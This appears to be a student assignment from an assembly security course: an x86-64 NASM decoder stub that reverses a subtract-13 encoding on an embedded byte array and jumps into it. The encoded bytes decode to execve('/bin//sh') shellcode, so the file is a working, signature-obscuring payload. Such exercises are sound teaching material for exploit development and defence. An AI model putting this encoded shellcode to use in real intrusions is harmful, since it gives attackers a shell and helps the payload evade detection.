# Filename: decoder.nasm
# Author: SLAE64-14209

global _start
section .text
_start:

  jmp short call_shellcode

decoder:
  pop rsi ; pop address of the shellcode in RSI
  xor rcx, rcx ; zeroize RCX register
  mov cl, 32 ; counter = 32 (length of the shellcode)

decode:
  cmp byte [rsi], 0xD ; compare if is possible to substract value 13
  jl max_reached ; jump if less -> max_reached
  sub byte [rsi], 0xD ; substract value 13
  jmp short shellcode

max_reached:
  xor rdx, rdx ; zeroize EDX register
  mov dl, 0xD ; set 13 into RDX
  sub dl, byte [rsi] ; 13 - byte value of the shellcode
  xor rbx, rbx ; zeroize RBX register
  mov bl, 0xff ; 0xff = 255 
  inc rbx ; = 256
  sub bx, dx ; 256 - (13 - byte value of the shellcode)
  mov byte [rsi], bl ; move bl into RSI

shellcode:
  inc rsi ; move to next byte
  loop decode ; loop "decode"
  jmp short EncodedShellcode

call_shellcode:

  call decoder
  EncodedShellcode: db 0x55,0x3e,0xcd,0x5d,0x55,0xc8,0x3c,0x6f,0x76,0x7b,0x3c,0x3c,0x80,0x75,0x60,0x55,0x96,0xf4,0x5d,0x55,0x96,0xef,0x64,0x55,0x96,0xf3,0x55,0x90,0xcd,0x48,0x1c,0x12
